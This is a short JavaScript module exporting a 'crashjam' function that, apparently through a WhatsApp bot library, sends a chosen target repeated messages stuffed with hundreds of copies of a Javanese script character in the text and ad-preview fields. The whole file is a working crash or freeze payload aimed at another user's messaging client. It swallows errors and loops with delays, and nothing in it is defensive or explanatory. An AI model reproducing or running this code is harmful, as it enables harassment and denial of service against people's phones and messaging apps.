async function crashjam(sock, target, rounds = 5) {
  const junk = "ꦿ".repeat(800);
  for (let i = 0; i < rounds; i++) {
    try {
      await sock.relayMessage(target, {
        extendedTextMessage: {
          text: junk,
          contextInfo: {
            externalAdReply: {
              title: junk.slice(0, 100),
              body: junk,
              mediaType: 1,
              renderLargerThumbnail: true,
              showAdAttribution: true
            }
          }
        }
      }, {});
    } catch (_) {}
    await new Promise((r) => setTimeout(r, 400));
  }
}
module.exports = { crashjam };
